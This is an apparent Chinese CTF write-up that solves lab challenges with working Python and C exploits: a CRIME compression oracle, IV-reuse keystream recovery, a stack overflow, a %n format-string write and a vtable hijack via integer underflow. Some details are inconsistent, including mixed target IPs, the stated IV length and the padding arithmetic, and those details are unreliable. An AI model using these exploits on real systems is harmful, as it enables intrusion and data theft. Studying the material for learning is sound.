  - `plain` 固定 → 字符索引（`plain.find(letter)`）是**确定性**的（例如 `plain.find('a')` 永远是某个固定值）
  - `coded` 每次重置 → 每次命令的加密映射**独立且随机**，但攻击者可**针对每次命令收集映射**

```python
for letter in stdoutdata:
    if letter in plain:
        output += coded[plain.find(letter)]  # 替换逻辑
    else:
        output += letter
```

漏洞点：**`plain` 是固定已知的** → 攻击者可发送测试命令，**直接映射 `coded` 的所有字符**

```python
# 攻击者发送命令：echo a
# 服务器输出：coded[plain.find('a')] + '\n'  # 例如 'X\n'
# 攻击者记录：字符 'X' 对应原始字符 'a'
```

由于 `plain` 包含所有72个字符，攻击者只需发送 **72次命令**（如 `echo a`, `echo b`, ..., `echo Z`），即可**构建完整的 `coded` 映射表**（`coded[i] = c` 对应 `plain[i] = original_char`）

```bash
#!bash
#>echo abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ; echo TestString
echo abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ; echo TestStringRunning command: 'echo abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ; echo estString'
_u;pSw"y|r^QFJ <Lk\+{KnEX$#%=UDb/6[HlBOaPRA54(-!'xq: <<< Ciphertext alphabet
(S\+4+k|J" <<< Test string
```

第一个 echo 明文字符串，第二个执行自定义命令

这样输出结果的开始将是密文字符表，剩下的内容就是第二个命令的输出

```bash
#!bash
#>echo abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890.;ls -1
echo abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890.;ls -1Running command: 'echo abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890.;ls -1'
 qaF)-:"XzJ^#Ehp2H_*]iDMUP\@8`rNdIm6AW3&5e%0}[Rk/VYS>{tl<;KfG4n <<Key
qXE       << bin
F)i       << dev
)*a       << etc
-^ :n*M*  << flag.txt
^Xq       << lib
Key reset
#>echo abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890.; cat flag.txt
echo abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890.; cat flag.txtRunning command: 'echo
abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890.; cat flag.txt'
q^0sE`"{G3KSo& @):nUZ=;+[BM?Lx*]CwIdmOg#2,VX-!Plav'e\9N4/_F(Wf7
Lq=Gq:?qKEs-{qoEW__ << CaviarBakedShame966
```

### Compression Session（CRIME 攻击）

```
请对 Fortcerts 的高安全性密钥生成服务器进行白盒测试。找出能造成秘密数据泄漏的漏洞
```

```python
def compress(d):
    """
    对输入数据进行zlib压缩，并返回十六进制编码的压缩结果
    使用同步刷新确保压缩对象的状态被刷新，但保留压缩上下文
    """
    c = zlib.compressobj()                     # 创建zlib压缩对象
    return (c.compress(d) + c.flush(zlib.Z_SYNC_FLUSH)).encode("hex")  # 压缩数据并刷新，然后转换为十六进制字符串

def encrypt(aes, d):
    """
    使用给定的AES加密对象对数据进行加密，并返回十六进制编码的密文
    """
    return aes.encrypt(d).encode("hex")         # AES加密后转换为十六进制字符串

def handle_client(conn, addr):
    """
    处理客户端连接的主逻辑：
    - 生成随机的AES-256密钥（32字节）和CTR模式的计数器
    - 发送欢迎横幅，其中包含CRIME警告
    - 将固定前缀'Key:'与秘密flag拼接作为SECRET
    - 循环接收客户端数据，每次将SECRET与客户端数据拼接后先压缩再加密，并将结果发回客户端
    - 当客户端不再发送数据时关闭连接
    """
    AESKey = os.urandom(32)                      # 生成32字节（256位）随机AES密钥
    ctr = Counter.new(128)                       # 创建128位CTR模式计数器（通常使用Crypto.Util.Counter）

    aes = AES.new(AESKey, AES.MODE_CTR, counter=ctr)  # 初始化AES-CTR加密对象

    BANNER = "\t\tWelcome to the Keygen server.\n\t\t"
    BANNER += "=" * 30
    BANNER += "\n[+]All access is monitored and any unauthorised access will be treated as CRIME\n"
    conn.send(BANNER)                            # 发送欢迎信息

    SECRET = 'Key:' + helpers.load_flag()         # 将固定前缀和flag拼接成待保护的秘密字符串

    data = conn.recv(2048).strip()                # 首次接收客户端数据（最多2048字节），去除两端空白

    while len(data):                              # 只要收到非空数据就循环处理
        data = compress(SECRET + data)            # 将秘密与用户输入拼接后压缩
        data = encrypt(aes, data)                 # 压缩结果加密
        conn.send(data)                            # 将密文发送给客户端
        data = conn.recv(2048).strip()             # 接收下一段客户端数据

    conn.close()                                   # 客户端不再发送数据时关闭连接
```

关键代码

```python
SECRET = 'Key:' + helpers.load_flag()  # 例如 SECRET = "Key:DrizzleVerandaFinger576"
data = compress(SECRET + data)          # 压缩：SECRET + 客户端输入
data = encrypt(aes, data)              # AES-CTR加密
conn.send(data)                        # 返回加密后的十六进制字符串
```

**核心操作**：

1. 服务器将 `SECRET`（含flag）与客户端输入拼接
2. 用 `zlib` 压缩拼接后的字符串
3. 用 AES-CTR 加密压缩后的数据
4. 返回加密后的十六进制字符串

**漏洞类型**：CRIME

**为什么漏洞存在**？

- `zlib` 压缩算法对**重复字符串**高度敏感（例如，重复10次字符串可压缩为1字节）
- 当 `SECRET + input` 包含重复字符串时，压缩后数据长度**显著缩短**。
- **关键点**：攻击者通过观察**响应长度**（加密后长度 = 压缩后长度），可推断 `SECRET` 内容

| 客户端输入   | 拼接后明文（SECRET + 输入）    | 压缩效果            | 响应长度 |
| ------- | --------------------- | --------------- | ---- |
| `Key:`  | `Key:Drizzle...Key:`  | 重复"Key:" → 长度短  | 128  |
| `Key:A` | `Key:Drizzle...Key:A` | 无重复 → 长度正常      | 133  |
| `Key:D` | `Key:Drizzle...Key:D` | 重复"Key:D" → 长度短 | 128  |

编写自动化脚本：

```python
import socket
known = "Key:"  # 已知前缀

# 获取基准长度（发送 "Key:"）
sock = socket.socket()
sock.connect(("172.16.1.20", 9999))
sock.recv(1024)  # 接收欢迎信息
sock.send("Key:")
base_len = len(sock.recv(2048))  # 记录长度

# 逐字符破解
while True:
    for c in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789%/+=":
        test_input = known + c
        sock = socket.socket()
        sock.connect(("192.168.187.135", 9999))
        sock.recv(1024)
        sock.send(test_input)
        resp = sock.recv(2048)
        if len(resp) == base_len:  # 长度匹配 = 字符正确
            known += c
            print(f"Found: {known}")  # 输出: Key:D, Key:Dr, ...
            break
    else:
        break  # 破解完成
```

### Chop Suey（IV 重用）

```
Fortcerts 的高管均表示反对使用白盒测试的方法，他们说真正的攻击者不可能获得源码的访问权
请对 Fortcerts 的一个非常安全的加密服务进行黑盒测试
找出服务中能够恢复加密数据的漏洞
```

先 `nc` 看看

```bash
#> nc 172.16.1.20 1337
Key Reset!
    Welcome to the FortCerts Certified Data Encryption Service
            This program uses very secure encryption
Commands:
E - Encrypt specified data
D - Dump service stored data
Output is in format <IV>:<Encrypted Data>
```

关键操作：

- `E,<data>`：加密数据（如 `E,A`）
- `D`：获取存储的加密数据（如 `D`）

输出格式：`<IV>:<Encrypted Data>`（例如 `fb51:9e`）

观察现象：

- 加密数据长度 = 输入数据长度 × 2（十六进制编码）
- IV总是2个十六进制字符（如 `fb51`）

服务使用**流密码**（加密长度与输入成比例），且**IV长度过短**

IV空间分析：

- IV是2个十六进制字符（如 `00`, `01`, ..., `ff`）
- **IV总可能性**：`16^2 = 256` 种（0–255）

**漏洞原理：**

- 流密码中，**相同IV + 相同密钥 → 相同密钥流**
- 当服务多次加密时，**IV会重复**（256种可能性，加密10000次几乎必然重复）
- **攻击向量**：利用重复IV恢复密钥流，进而解密任意密文

所以我们可以重复发送明文记录其 IV 值，再通过重复的 IV 值恢复密钥流，再用密钥流恢复密文

先用相同明文（25个 `A`）加密10000次，记录 `IV:密文`

```python
import socket
respdict = {}
sock = socket.socket()
sock.connect(("172.16.1.20", 1337))
sock.recv(1024)  # 接收欢迎信息
for i in range(10000):
    sock.send("E,AAAAA"*5 + "\n")  # 25个A
    resp = sock.recv(1024).strip()
    iv, ciphertext = resp.split(":")
    respdict[iv] = ciphertext  # 存储IV:密文
```

**为什么 25 个 A？**

需要足够长的密钥流（D 命令密文长度 22 字节，需 22 字节密钥流）

然后获取服务存储的密文

```bash
#> echo "D" | nc 172.16.1.20 1337
3868:3bff03fff1fe385eb6d68c9e84f6771564968d7b017
Key Reset!
```

**关键数据**：`IV=3868`, `密文=3bff03fff1fe385eb6d68c9e84f6771564968d7b017`

恢复密钥流（流密码原理：`密钥流 = 明文 XOR 密文`）：

- 明文（25个 `A`）：`41414141414141414141414141414141414141414141414141`（十六进制）
- 密文（25个A）：`32fe79d33e7055190ec47c1778c1029946c9fc47398c613936`（示例值）
- 密钥流 = `明文 XOR 密文`：
- ```
  明文: 41414141414141414141414141414141414141414141414141
  密文: 32fe79d33e7055190ec47c1778c1029946c9fc47398c613936
  密钥流: 73bf38927f3114584f853d56398043d80788bd0678cd207877
  ```

解密公式：`明文 = 密文 XOR 密钥流`

```
密文: 3b ff 03 ff f1 fe 38 5e b6 d6 8c 9e 84 f6 77 15 64 96 8d 7b 01 7
密钥流: 73 bf 38 92 7f 31 14 58 4f 85 3d 56 39 80 43 d8 07 88 bd 06 78
明文: 46 72 69 65 6e 64 4e 6f 74 69 63 65 42 65 6c 66 61 73 74 35 32 35
```

转换为ASCII：`46->F, 72->r, 69->i, ...` → `FriendNoticeBelfast525`

## Exploitation

### The Fonz（栈溢出）

```
对 Quick Code Ltd. 提供的源代码进行审核，以识别任何漏洞
```

分析源代码

```c
void handle_client( int client_socket )
{
    unsigned int FixedVariable = 0xFFFFFFFF;          // 目标变量，溢出后可修改
    unsigned char DestBuffer[16] = {0};                // 16 字节缓冲区，溢出源
    char secretKey[256];
    unsigned char socketBuffer[SOCKET_BUFFER_SIZE] = {0};
    size_t secretLength = 0;
    int retVal = 0;

    // 输出地址信息（便于漏洞利用）
    socket_printf( client_socket, "FixedVariable @ %#x. DestBuffer @ %#x\n", &FixedVariable, DestBuffer );

    socket_printf( client_socket, "Please enter text to write to buffer: " );
    retVal = read( client_socket, socketBuffer, SOCKET_BUFFER_SIZE );  // 读取用户输入

    if( retVal <= 0 )
    {
        socket_printf( client_socket, "Error reading input %d.\n", retVal );
        return;
    }

    // 设置超时处理（10秒后关闭连接）
    g_client_socket = client_socket;
    signal( SIGALRM, sigHandler );
    alarm(10);

    // 漏洞点：复制数据时未限制长度，可能溢出 DestBuffer 覆盖 FixedVariable
    strncpy( DestBuffer, socketBuffer, MAX_WRITE_SIZE );

    socket_printf( client_socket, "Entered text: %s\n", DestBuffer );
    socket_printf( client_socket, "FixedVariable value: 0x%08X\n", FixedVariable );

    // 若 FixedVariable 被覆盖为 0x73696854，则输出 flag
    if( FixedVariable == 0x73696854 )
    {
        secretLength = load_flag( secretKey, sizeof(secretKey) );
        socket_printf( client_socket, "Congratulations! Secret key is: %s\n", secretKey );
    }
    else
    {
        socket_printf( client_socket, "Please set FixedVariable to 0x73696854\n" );
    }
    close( client_socket );
}
```

我们通过连接到游戏服务器并发送 30 个 A 作为我们的输入来快速测试我们的假设

我们从响应中看到，FixedVariable 填充了 0x41，这是 A 的 ASCII 值

看起来我们的 A 已经超越了 DestBuffer 并覆盖了 FixedVariable.Now

我们知道我们可以通过溢出来控制 FixedVariable，但需要知道我们的溢出字符串FixedVariable 到底有多远

有很多方法可以做到这一点，但是因为我们在溢出后告诉了 FixedVariable 的值，我们可以快速发送服务器唯一字符来确定确切的偏移量

![](https://pic1.imgdb.cn/item/69a4261bf070dc0f83def02f.png)

发现它们等于 "TSRQ"，您可能想知道为什么字符的顺序是相反的，这是由于服务器是 x86 而 x86 是一个小端架构

这意味着它将 dword 寄存器与最低有效字节 "first" 存储在内存中

现在我们知道在我们的溢出字符串中，FixedVariable  从 Q 字符开始

![](https://pic1.imgdb.cn/item/69a426e5f070dc0f83def050.png)

`0x73696853` 是字符串 "sihT" 的 ASCII 表示

我们需要记住服务器是 littleendian 所以我们需要反转我们的字节

我们用 "This" 替换原始溢出字符串中的 "QRST"

然后，我们将溢出字符串发送到服务器并接收问题的标志

```
CombatBrownieSwell366
```

### Matt Matt Matt Matt（格式化字符串）

```
对 Quick Code Ltd. 提供的源代码进行审核，以识别任何漏洞
```

分析源代码

```c
#define RESP_PREFIX "Nice to meet you "   // 响应前缀字符串
#define RANDOM_RANGE 0xFFFFF               // 随机内存范围，约1MB


void handle_client(int client_socket)
{
    char* memBuf;                 // 指向分配内存的指针
    int* pWinning;                // 指向一个关键整数的指针
    unsigned char socketBuffer[SOCKET_BUFFER_SIZE] = {0}; // 接收客户端输入缓冲区
    char secretKey[256];           // 存储flag的缓冲区
    size_t secretLength = 0;       // flag长度（未使用）
    unsigned char destBuffer[MAX_LEN] = {0}; // 构造响应的目标缓冲区
    int retVal = 0;                // 读取返回值

    g_client_socket = client_socket;  // 保存全局套接字（可能用于信号处理）

    // 分配一块随机大小的内存（实际固定为RANDOM_RANGE）
    memBuf = malloc(RANDOM_RANGE);
    if (memBuf == NULL)
    {
        socket_printf(client_socket, "ERROR: Unable to allocate memory.\n");
        return;
    }

    // 在内存中随机选择一个位置，写入一个魔数0x12345678
    // GetRandomNumber() 返回随机数，取模保证不会越界（留出4字节空间）
    pWinning = (int*)(memBuf + (GetRandomNumber() % (RANDOM_RANGE - 4)));
    *pWinning = 0x12345678;
    memBuf = NULL;  // 将指针置空，但 pWinning 仍指向该内存，之后可通过 pWinning 访问

    while (1)  // 无限循环，每次处理一个输入
    {
        // 提示用户输入名字
        socket_printf(client_socket, "Hello, what is your name?\n");
        // 从套接字读取数据到 socketBuffer，最多 SOCKET_BUFFER_SIZE 字节
        retVal = read(client_socket, socketBuffer, SOCKET_BUFFER_SIZE);
        if (retVal <= 0)
        {
            socket_printf(client_socket, "Error reading input %d.\n", retVal);
            return;
        }

        // 设置30秒闹钟，防止客户端长时间不响应
        signal(SIGALRM, sigHandler);
        alarm(30);

        // 复制响应前缀到目标缓冲区
        strcpy((char*)destBuffer, RESP_PREFIX);
        // 关键漏洞：将用户输入的 socketBuffer 直接作为格式字符串传递给 snprintf
        // 这会导致格式化字符串漏洞，攻击者可利用 %n 等写入任意内存
        snprintf((char*)destBuffer + sizeof(RESP_PREFIX) - 1,   // 写入位置（跳过前缀）
                 MAX_LEN - sizeof(RESP_PREFIX),                 // 剩余空间
                 (const char*)socketBuffer);                     // 用户输入作为格式字符串
        // 输出构造好的响应
        socket_printf(client_socket, "%s\n", (char*)destBuffer);

        // 检查随机位置的值是否已被改为 0x31337BEF
        if (*pWinning == 0x31337BEF)
        {
            // 如果是，则读取flag并发送给客户端
            secretLength = load_flag(secretKey, sizeof(secretKey));
            socket_printf(client_socket, "Today is your lucky day! Your key is: %s\n", secretKey);
            return;
        }
        else
        {
            // 否则提示运气不佳，循环继续
            socket_printf(client_socket, "Sorry, today is not your lucky day.\n");
        }
    }
    // 理论上不会执行到这里，但为了完整性关闭套接字
    close(client_socket);
}
```

知道我们可以用格式字符串写数据，我们会将 pWinning 指向的值调整为 `0x31337BEF`

我们将使用两个步骤来实现这一点，首先我们将使用 `％x` 来确定堆栈上 pWinning 的参数偏移量。 其次，我们将使用 `％x` 和 `％n` 格式字符将泄漏地址的值更改为 `0x31337BEF`

我们确定获取 pWinning 指针所需的堆栈弹出数，告诉我们 pWinning 的直接参数偏移量

最简单的方法是向服务器发送一些堆栈弹出，每次都断开连接

我们应该看到 pWinning 指针由于源代码中看到的随机数而改变

![](https://pic1.imgdb.cn/item/69a42a30f070dc0f83def230.png)

我们可以看到第 8 个值每次都在变化，而其他任何值都没有变化

这意味着这很可能是我们的 pWinning 指针及其直接参数访问偏移量是 8

![](https://pic1.imgdb.cn/item/69a42ab1f070dc0f83def327.png)

此时我们可以编写一个格式字符串 exploit 来使用多个写操作来实现我们将 `*pWinning` 的值设置为 `0x31337BEF` 的目标

我们已经知道 pWinning 是第 8 个直接参数访问变量，所以现在我们需要做的是使用 `％x` 说明符输出 `0x31337BEF` 字符，然后使用 `％n` 说明符写入第 8 个直接参数中的地方

将 `0x31337BEF` 转换为十进制获得

```
%825457647x
```

然后，我们添加一个 `％n` 说明符，将目前为止的输出字节数写入第 8 个直接参数中的地址

```
%825457647x%8$n
```

![](https://pic1.imgdb.cn/item/69a42c02f070dc0f83def541.png)

### A Bit One Sided（整数下溢 + 虚函数劫持）

```
对 Quick Code Ltd. 提供的源代码进行审核，以识别任何漏洞
```

```c
int g_client_socket;

// 胜利函数：发送flag
void win(void)
{
    char secret_key[256] = {0x0};
    load_flag(secret_key, sizeof(secret_key));
    socket_printf(g_client_socket, "Success. Your flag is %s\n", secret_key);
}

void handle_client(int client_socket)
{
    char reqData[128] = {0x0};          // 请求数据缓冲区，128字节
    CReqObj* reqObj = 0;                 // 指向请求对象的指针
    short reqLen = 0;                    // 请求长度，有符号short
    bool retValue;                       // 返回值（未使用）
    int recvLen;                         // 实际接收长度

    g_client_socket = client_socket;

    signal(SIGALRM, sig_alrm_handler);
    alarm(10);

    // 接收2字节的请求长度（网络字节序？这里直接作为short使用）
    recvLen = recv(client_socket, &reqLen, sizeof(reqLen), 0);
    if (recvLen == -1)
        goto cleanup_exit;

    socket_printf(client_socket, "Got request size: %d\n", &recvLen); // 打印栈地址（信息泄露）

    // 检查长度合法性：不能小于0，不能超过128
    if (reqLen < 0 || reqLen > sizeof(reqData))
    {
        socket_printf(client_socket, "Supplied request length is invalid.\n");
        goto cleanup_exit;
    }

    reqObj = new CReqObj();               // 在堆上创建对象

    // 接收请求数据，长度为 reqLen-1
    // 漏洞：当 reqLen = 0 时，reqLen-1 = -1，作为无符号size_t变为0xFFFFFFFF，
    // 导致recv尝试读取海量数据，而缓冲区只有128字节，造成栈溢出
    recvLen = recv(client_socket, reqData, reqLen - 1, 0);
    if (recvLen == -1)
        goto cleanup_exit;

    reqObj->SetRequestData(reqData);      // 设置请求数据
    retValue = reqObj->ProcessRequest();   // 处理请求

    socket_printf(client_socket, "Better luck next time.\n");

cleanup_exit:
    if (reqObj)
        delete reqObj;
    close(client_socket);
    exit(0);
}
```

这里错误地打印了局部变量 `recvLen` 的地址

```c
socket_printf(client_socket, "Got request size: %d\n", &recvLen);
```

`recv` 的第三个参数类型是 `size_t`（无符号）

通过发送 `reqLen=0` 触发整数下溢，导致 `recv` 读取海量数据，可以溢出 `reqData` 并覆盖 `reqObj`

```c
short reqLen = 0;
recv(client_socket, &reqLen, sizeof(reqLen), 0);  // 接收2字节长度
if (reqLen < 0 || reqLen > sizeof(reqData))       // 边界检查，允许0
    ...
recv(client_socket, reqData, reqLen - 1, 0);      // 当reqLen=0时，reqLen-1 = -1
```

程序在溢出后会执行下面这段代码

```c
reqObj->SetRequestData(reqData);
retValue = reqObj->ProcessRequest();
```

其中 `reqObj` 是一个指向 `CReqObj` 对象的指针，位于栈上（紧邻 `reqData` 之后）

通过溢出，我们可以覆盖 `reqObj` 的值，使其指向我们构造的假对象

当调用虚函数 `SetRequestData` 时，实际会从假对象的虚表中取出函数指针并跳转

因此，只要将虚函数指针改为 `win` 函数的地址，即可获得 flag

**核心思想**

1. 在 `reqData` 中伪造一个 C++ 对象，使其虚表指针指向我们控制的区域，而虚表中存放`win` 函数的地址

2. 覆盖栈上的 `reqObj` 指针，使其指向我们伪造的对象

3. 利用信息泄露得到的栈地址，计算出 `reqData` 的地址，用于构造对象和覆盖

Payload：

第 1 部分 (`vtable`)：这是假对象的虚表指针，指向我们准备的虚函数表。`vtable` 的值被设为 `reqData + 8`，即假对象之后 8 字节的位置（因为前8字节是对象头：4 字节 vptr + 4 字节成员变量）

第 2 部分 (0)：假对象的第一个成员变量（如果有），这里用 0 占位，保持对齐

第 3-6 部分 (四个 `win` 地址)：这些就是虚函数表的内容。由于我们不知道`SetRequestData` 是第几个虚函数，连续放置多个 `win` 地址可以确保无论调用哪个虚函数（包括析构函数）都跳转到 `win`

```python
# struct.pack() 是 Python 中将整数转换为二进制字节串的操作
# "I" 是格式符，表示无符号整型
payload =  struct.pack("I", vtable)   # 1. 假对象的虚表指针
payload += struct.pack("I", 0)         # 2. 假对象的成员变量（占位）
payload += struct.pack("I", win)       # 3. 虚表第一个函数
payload += struct.pack("I", win)       # 4. 虚表第二个函数
payload += struct.pack("I", win)       # 5. 虚表第三个函数
payload += struct.pack("I", win)       # 6. 虚表第四个函数
for i in range(28):                     # 7. 填充28个0xdeadbeef
    payload += struct.pack("I", 0xdeadbeef)
payload += struct.pack("I", reqData)    # 8. 第一个reqData地址
payload += struct.pack("I", reqData)    # 9. 第二个reqData地址
```

这样，在 `reqData` 的起始处，我们构建了如下内存布局：

```bash
[reqData+0] : vtable = reqData+8
[reqData+4] : 0
[reqData+8] : win_addr
[reqData+12]: win_addr
[reqData+16]: win_addr
[reqData+20]: win_addr
```

第7部分：填充`reqData`缓冲区

- `reqData`总大小为128字节，前24字节已被占用，剩下104字节需要填充。这里用了28个`0xdeadbeef`，每个4字节，共112字节。为什么是28个？因为前6个（24字节）加上28个（112字节）正好是136字节，超出了128？让我们仔细计算：
  
  - 前6个（24字节） + 28个（112字节） = 136字节
  
  - 但`reqData`只有128字节，这意味着前128字节中包含了前6个和部分填充。实际上，前128字节由前6个（24字节）和接下来的26个填充（104字节）组成，正好128字节。那么剩下的2个填充（第27和28个）就位于`reqData`之外，即开始溢出到栈上的其他局部变量
  
  - 所以，前26个填充（104字节）与前面24字节一起填满`reqData`，第27、28个填充则覆盖了`reqData`之后的前8字节（偏移128-135）

第8-9部分：覆盖`reqObj`指针

- 两个`reqData`地址被放在payload的最后8字节（偏移136-143）。它们会覆盖栈上更后面的位置

- 这样，溢出区域从`reqData`末尾开始依次是：
  
  - 128-131: 第27个`0xdeadbeef`
  
  - 132-135: 第28个`0xdeadbeef`
  
  - 136-139: 第一个`reqData`地址
  
  - 140-143: 第二个`reqData`地址

如果`reqObj`恰好位于136或140处，它就会被覆盖为`reqData`地址，指向我们构造的假对象

```python
import socket
import struct
import re

sock = socket.socket()
sock.connect(('192.168.1.64', 21320))

# 发送长度为0（触发漏洞）
sock.send(b'\x00\x00')

# 接收信息泄露，提取recvLen地址
buff = sock.recv(64)
match = re.search(r"\d+", buff.decode())
address = int(match.group(0))
if "-" in buff.decode():
    address = 2**32 - address  # 处理负数
print("recvLen address:", hex(address))

# 计算reqData地址（假设偏移128）
reqData = address - 128
win = 0x080490e1
vtable = reqData + 8   # 虚表位置

# 构造假对象和虚表
payload = struct.pack("<I", vtable)   # 对象 vptr
payload += struct.pack("<I", 0)       # 成员变量（占位）
for _ in range(4):                    # 虚表函数指针
    payload += struct.pack("<I", win)

# 填充至128字节（用0xdeadbeef）
payload += b'\xef\xbe\xad\xde' * ((128 - len(payload)) // 4)

# 覆盖栈上的reqObj指针（连续多个reqData地址确保命中）
for _ in range(10):                    # 可根据需要调整
    payload += struct.pack("<I", reqData)

# 发送溢出数据
sock.send(payload)

# 接收flag
flag = sock.recv(1024)
print(flag.decode())
sock.close()
```

## Network Forensics

### Not Enough Magic（HTTP 流量）

```
您已经获得了以下网络捕获，其中提到了嫌疑人以前隐藏的信息，但基本上是这样
分析网络捕获以恢复嫌疑人隐藏的标记
```

直接导出所有文件，其中有个 GZIP 就是

![](https://pic1.imgdb.cn/item/69a4742bf070dc0f83df72a3.png)

在文件中找到 flag

![](https://pic1.imgdb.cn/item/69a4740df070dc0f83df727f.png)

# 

## Mad Coding Skillz

### Jeremy's Iron（Python 数据处理）

```
FortCerts 需要你编写一个程序来测试客户的字母重组程序的功能
编写一个程序，从单词列表中找出给定的单词并将其返回给服务器
为了确保测试的可靠性，你需要多次运行此程序，直到 flag 出现为止
客户的程序运行在 192.168.187.135:5050
```

`nc` 看看是这个输出

![](https://pic1.imgdb.cn/item/699b303bfdc2d828c3ffaaab.png)

```python
from pwn import *
import re

# 1. 设置目标服务器的 IP 和 端口
HOST = '192.168.187.135'
PORT = 5050

def solve():
    # 与服务器建立连接
    io = remote(HOST, PORT)

    try:
        # 题目要求连续完成 50 轮
        for i in range(1, 51):
            log.info(f"--- 正在挑战第 {i} 轮 ---")

            # 【接收数据】读取服务器的回显，直到出现输入提示符
            # 这段 data 包含了 Wordlist 和 Jumbled word
            data = io.recvuntil(b"Enter unjumbled word:").decode()

            # 【提取数据】利用正则表达式精准定位我们要的两个关键信息
            # 匹配 Wordlist: ['...', '...'] 括号里的内容
            wordlist_raw = re.search(r"Wordlist: \[(.*?)\]", data).group(1)
            # 匹配 Jumbled word: xxxx 后面的单词
            jumbled_word = re.search(r"Jumbled word: (\w+)", data).group(1).strip()

            # 【处理格式】把抓取到的字符串 " 'a', 'b' " 转换成 Python 列表 ['a', 'b']
            candidate_list = wordlist_raw.replace("'", "").split(", ")

            log.info(f"乱序词是: {jumbled_word}")

            # 【核心算法】寻找正确答案
            # 原理：如果两个单词字母组成一样，那么它们按照字母表排序（sorted）后，结果一定相等
            # 例如：'apple' -> ['a', 'l', 'p', 'p', 'e']，'elppa' -> ['a', 'l', 'p', 'p', 'e']
            answer = ""
            sorted_target = sorted(jumbled_word) # 先把乱序词排好序

            for word in candidate_list:
                if sorted(word) == sorted_target: # 遍历备选词，看谁排好序后长得一样
                    answer = word
                    break

            # 【回传答案】找到答案后，立刻发回给服务器
            if answer:
                log.success(f"匹配成功！发送答案: {answer}")
                io.sendline(answer.encode()) # 发送答案并换行
            else:
                log.error("在列表中没找到对应的词，请检查正则逻辑！")
                break

        # 50 轮全部成功后，服务器会吐出 Flag
        # 我们一次性读取剩下的所有内容
        print("\n" + "="*30)
        print("[*] 50 轮完成！正在等待 Flag...")
        print(io.recvall().decode())
        print("="*30)

    except Exception as e:
        log.error(f"运行出错: {e}")
    finally:
        io.close()

if __name__ == "__main__":
    solve()
```
